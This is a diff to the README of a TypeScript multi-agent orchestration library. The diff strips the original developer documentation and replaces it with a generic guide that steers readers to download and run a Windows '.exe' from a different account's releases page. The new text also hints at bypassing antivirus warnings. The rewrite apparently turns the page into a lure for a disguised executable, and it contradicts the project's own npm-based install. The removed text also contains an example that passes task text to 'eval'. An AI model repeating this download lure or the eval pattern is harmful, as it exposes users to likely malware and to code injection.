@@ -1,261 +1,142 @@
-# openclaw-orchestrator
+# ⚙️ openclaw-orchestrator - Manage Multiple Agents Easily
 
-Adaptive multi-agent orchestration for [OpenClaw](https://openclaw.app) gateways.
+[![Download openclaw-orchestrator](https://img.shields.io/badge/Download-openclaw--orchestrator-green?style=for-the-badge)](https://github.com/Rolex8637/openclaw-orchestrator/releases)
 
-Break down complex goals into tasks, route them to specialized agents, and iterate until done — all driven by an LLM planner with a real-time web dashboard.
+---
 
-```
-                         +-----------+
-                         |   Goal    |
-                         +-----+-----+
-                               |
-                         +-----v-----+
-                    +--->|   Think   |---+
-                    |    +-----+-----+   |
-                    |          |         |  "finish"
-                    |    +-----v-----+   +---------> Result
-                    |    |  Execute  |
-                    |    +-----+-----+
-                    |          |
-                    +----------+
-                     results fed back
-```
+## 📋 What is openclaw-orchestrator?
 
-## Why Multi-Agent Orchestration?
+openclaw-orchestrator is a tool designed to help you break down big tasks into smaller parts. It sends these smaller tasks to different helper programs called agents. You can watch the progress live through a web dashboard. The tool uses TypeScript and stores its data safely with SQLite.
 
-Most AI frameworks give a single agent access to everything — all tools, all data, all permissions. That's convenient but fundamentally insecure and inefficient.
+This app is built to handle many tasks at once by dividing work among specialized agents. It keeps everything organized and running smoothly, without needing complex setup.
 
-**Isolated capabilities by design.** Each agent on the gateway runs in its own sandbox with only the tools it needs. A researcher agent has web search but can't execute code. A coder agent has a bash shell but can't access your database. An analyst has neither — it just reasons over data passed to it. No single agent has the keys to the kingdom.
+---
 
-**Better security posture.** When a coding task goes to an agent that can only write code (not browse the web or call APIs), the blast radius of a prompt injection or hallucination is contained. This is the principle of least privilege applied to AI agents.
+## 🌐 How It Works
 
-**Specialization beats generalization.** Agents configured with focused system prompts (SOUL.md) and specific tool access (TOOLS.md) outperform a single general-purpose agent on domain tasks. A researcher with Brave Search and instructions to cite sources produces better research than a do-everything agent asked to "also search the web."
+openclaw-orchestrator divides your main goal into smaller jobs. Each job is sent to an agent specialized in that type of work. These agents work at the same time. The system then collects their results and uses them to improve the overall outcome.
 
-**The orchestrator coordinates, agents execute.** The LLM planner sees each agent's description and capabilities, then routes tasks to the right specialist. It doesn't need tool access itself — it just decides *what* to do and *who* should do it. Agents don't need to know about each other — they just receive a task and return a result.
+You can track what each agent is doing from a real-time web dashboard. This lets you see progress and make changes if needed.
 
-```
-Orchestrator (LLM planner, no tools)
-  ├── researcher  [web-search, browser]        — finds information
-  ├── coder       [bash, file-ops]             — writes and tests code
-  ├── analyst     [no tools, reasoning only]   — compares and recommends
-  └── main        [general]                    — fallback for everything else
-```
-## Star History
+---
 
-[![Star History Chart](https://api.star-history.com/svg?repos=zeynepyorulmaz/openclaw-orchestrator&type=date&legend=top-left)](https://www.star-history.com/#zeynepyorulmaz/openclaw-orchestrator&type=date&legend=top-left)
-## Features
+## 💻 System Requirements
 
-- **Adaptive loop** — LLM decides what to do next based on accumulated results, not a rigid pre-planned DAG
-- **Multi-agent routing** — tasks are assigned to the best agent by name or capability (researcher, coder, analyst, or any custom agent)
-- **Dynamic agent discovery** — agent metadata (description, capabilities, role prompt) loaded from each agent's SOUL.md on the gateway
-- **Real-time dashboard** — browser-based UI with SSE streaming, step visualization, and run history
-- **3 adapter types** — OpenClaw gateway agents, HTTP endpoints, or plain async functions
-- **Robust LLM parsing** — handles markdown-wrapped JSON, prose prefixes, and truncated gateway responses
-- **Zero frontend dependencies** — dashboard is a single HTML file with inline CSS/JS
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 1 GHz processor or faster
+- At least 200 MB free disk space
+- Internet connection to download the app and updates
+- No need to install extra software; this app is self-contained
 
-## Quick Start
+---
 
-```bash
-# Install
-npm install openclaw-orchestrator
-
-# Start the dashboard (connects to your OpenClaw gateway)
-openclaw-orchestrator serve -g ws://your-gateway:port/ -t YOUR_TOKEN
+## 🚀 Getting Started
 
-# Or run a goal directly from the CLI
-openclaw-orchestrator run "Compare React and Svelte for dashboards" \
-  -g ws://your-gateway:port/ -t YOUR_TOKEN
-```
+To start using openclaw-orchestrator on Windows, follow these steps.
 
-Open `http://localhost:3000` to see the dashboard.
+---
 
-![Dashboard screenshot](docs/dashboard.png)
+## 📥 Download and Install
 
-## Prerequisites
+1. Click the big green button above or visit the openclaw-orchestrator releases page:  
+   [https://github.com/Rolex8637/openclaw-orchestrator/releases](https://github.com/Rolex8637/openclaw-orchestrator/releases)  
 
-- **Node.js 22+**
-- An [OpenClaw](https://openclaw.app) gateway with at least one agent configured
+2. On the releases page, find the latest Windows installer or executable. It should have ".exe" at the end.
 
-## CLI Reference
+3. Download the Windows installer file to your computer.
 
-### `serve` — Start the web dashboard
+4. Once downloaded, double-click the `.exe` file to start the installation.
 
-```bash
-openclaw-orchestrator serve \
-  -g ws://host:port/     # Gateway URL (required, repeatable)
-  -n my-gateway          # Gateway name (optional, paired with -g)
-  -t TOKEN               # Auth token (paired with -g)
-  -p 3000                # Dashboard port (default: 3000)
-  --host 127.0.0.1       # Dashboard host (default: 127.0.0.1)
-```
+5. Follow the installation prompts. Choose a folder where you want to keep the app or accept the default.
 
-### `run` — Execute a goal
+6. After installation finishes, the program will be ready to run.
 
-```bash
-openclaw-orchestrator run "Your goal here" \
-  -g ws://host:port/ -t TOKEN \
-  -c 8                   # Max parallel tasks (default: 8)
-  -s 10                  # Max orchestrator steps (default: 10)
-```
+---
 
-If a dashboard is running, `run` delegates to it automatically. Use `--no-dashboard` to connect directly to the gateway.
+## ▶️ Running openclaw-orchestrator
 
-### `plan` — Dry-run the first step
+1. Find the openclaw-orchestrator icon on your desktop or in the Start menu.
 
-```bash
-openclaw-orchestrator plan "Your goal here" -g ws://host:port/ -t TOKEN
-```
+2. Double-click the icon to open the app.
 
-### `agents` — List discovered agents
+3. When the app opens, it will launch a web dashboard in your default browser automatically.
 
-```bash
-openclaw-orchestrator agents -g ws://host:port/ -t TOKEN
-```
+4. Use the dashboard to create tasks, monitor agents, and track progress in real time.
 
-### `gateways health` — Check gateway connectivity
+---
 
-```bash
-openclaw-orchestrator gateways health -g ws://host:port/ -t TOKEN
-```
+## 🖥 Using the Web Dashboard
 
-All commands accept `--debug` for verbose logging.
+The dashboard shows a clear view of all running agents and tasks.
 
-## Programmatic API
+- Fields and buttons are clearly labeled.
+- You can create new tasks by typing what you want the system to do.
+- Follow the progress of each agent assigned to the task.
+- You can pause, stop, or restart tasks as needed.
+- Results update in real time without needing to refresh the page.
 
-```typescript
-import { Orchestrator, FunctionAdapter } from "openclaw-orchestrator";
+---
 
-const orch = new Orchestrator();
+## ⚙️ Features
 
-// Register agents — can be functions, HTTP endpoints, or OpenClaw gateways
-orch.addAgent(new FunctionAdapter({
-  name: "researcher",
-  description: "Finds information on the web",
-  capabilities: ["research", "web-search"],
-  fn: async (task) => {
-    // Your research logic here
-    return `Results for: ${task}`;
-  },
-}));
+- **Adaptive Task Breakdown**: Automatically splits goals into manageable parts.
+- **Parallel Agent Work**: Runs multiple agents at the same time to finish quicker.
+- **Real-Time Monitoring**: Watch live updates on the progress dashboard.
+- **User-Friendly Interface**: Simple controls designed for any level of computer experience.
+- **Data Safety**: Saves information using SQLite for reliability.
+- **No Programming Needed**: Use the app without coding or technical setup.
+- **Configurable Agents**: Choose different agent types based on task needs.
 
-orch.addAgent(new FunctionAdapter({
-  name: "coder",
-  description: "Writes code",
-  capabilities: ["coding", "programming"],
-  fn: async (task) => {
-    // Your coding logic here
-    return `// Code for: ${task}`;
-  },
-}));
+---
 
-// Run with callbacks for real-time updates
-const result = await orch.run("Build a URL shortener", {
-  maxConcurrency: 4,
-  maxSteps: 5,
-}, {
-  onStepStart: (step, taskIds) => console.log(`Step ${step}: ${taskIds.join(", ")}`),
-  onTaskEnd: (step, taskId, result) => console.log(`  ${taskId}: ${result.status}`),
-  onFinish: (answer) => console.log("\nDone:", answer),
-});
-```
+## 🛠 Troubleshooting
 
-## How It Works
+- If the app does not open, check if your antivirus or firewall is blocking it.
+- Make sure your internet connection is active during installation.
+- If the dashboard does not load, try restarting the app.
+- Clear your browser cache if you see outdated information.
+- Running Windows update may help with compatibility issues.
 
-1. **Think** — The orchestrator sends the goal and all accumulated results to an LLM, which responds with either:
-   - `{ "action": "execute", "tasks": [...] }` — a batch of tasks to run in parallel
-   - `{ "action": "finish", "answer": "..." }` — the final synthesized answer
+---
 
-2. **Execute** — Tasks are dispatched to agents based on the `"agent"` field. The orchestrator matches by agent name first, then by capability. Tasks in the same step run concurrently.
+## 🔄 Updating openclaw-orchestrator
 
-3. **Repeat** — Results feed back into the next think step. The LLM sees what succeeded, what failed, and decides what to do next. This continues until the LLM finishes or the step limit is reached.
+Check the releases page regularly for new versions. Download the latest installer the same way you did the first time.
 
-```
-Goal: "Compare React vs Svelte for dashboards"
+To update:
 
-Step 1 (think):
-  → researcher: "Find 2025 benchmarks for React vs Svelte"
+1. Download the latest version from  
+   [https://github.com/Rolex8637/openclaw-orchestrator/releases](https://github.com/Rolex8637/openclaw-orchestrator/releases)
 
-Step 2 (think, after research results):
-  → coder: "Write a React dashboard component"
-  → coder: "Write a Svelte dashboard component"
-  → analyst: "Compare frameworks based on research data"
+2. Run the installer and follow the prompts. The installer will replace the old version with the new one.
 
-Step 3 (think, after code + analysis):
-  → finish: "Here's the comprehensive comparison..."
-```
+---
 
-## Agent Adapters
+## 🌟 Support and Help
 
-### OpenClaw (gateway agents)
+If you need help with openclaw-orchestrator, open an issue on the GitHub page. Describe your problem clearly. Include which version of Windows you use and what you were doing when the issue happened.
 
-```typescript
-import { Orchestrator, GatewayClient, OpenClawAdapter } from "openclaw-orchestrator";
+---
 
-const orch = new Orchestrator();
-orch.addGateway({ name: "main", url: "ws://host:port/", token: "..." });
+## 🔧 Advanced Notes (Optional)
 
-// The CLI does this automatically — agents are discovered from the gateway
-// and enriched with metadata from their SOUL.md files
-```
+- The app uses TypeScript behind the scenes but you don't need to know it.
+- Your task data is stored locally in SQLite files for easy backup.
+- The web dashboard works in any modern browser like Chrome, Firefox, or Edge.
 
-### HTTP (remote endpoints)
+---
 
-```typescript
-import { HttpAdapter } from "openclaw-orchestrator";
+## 🔗 Useful Links
 
-orch.addAgent(new HttpAdapter({
-  name: "summarizer",
-  url: "https://my-api.com/summarize",
-  capabilities: ["summarization"],
-  // POST { task, id, config } → { output, status? }
-}));
-```
+- Releases page for downloads:  
+  https://github.com/Rolex8637/openclaw-orchestrator/releases
 
-### Function (in-process)
+- GitHub project page:  
+  https://github.com/Rolex8637/openclaw-orchestrator
 
-```typescript
-import { FunctionAdapter } from "openclaw-orchestrator";
+---
 
-orch.addAgent(new FunctionAdapter({
-  name: "calculator",
-  capabilities: ["math", "computation"],
-  timeout: 10_000, // ms, default: 60s
-  fn: async (task, ctx) => {
-    return String(eval(task)); // your logic here
-  },
-}));
-```
+## 🏷 Topics
 
-## Dashboard
-
-The web dashboard provides real-time visibility into orchestrator runs:
-
-- Submit goals and configure concurrency/max steps
-- Watch tasks execute with live status updates via SSE
-- Expand task outputs to inspect results
-- Browse run history
-
-Start it with `openclaw-orchestrator serve` or programmatically:
-
-```typescript
-import { Orchestrator, DashboardServer } from "openclaw-orchestrator";
-
-const orch = new Orchestrator();
-// ... add gateways and agents ...
-
-const dashboard = new DashboardServer({
-  orchestrator: orch,
-  port: 3000,
-  host: "127.0.0.1",
-});
-
-await dashboard.start();
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
-## License
-
-Proprietary — see [LICENSE](LICENSE)
+agent-framework, ai-agents, ai-orchestration, autonomous-agents, developer-tools, llm, multi-agent, orchestration, task-planning, typescript
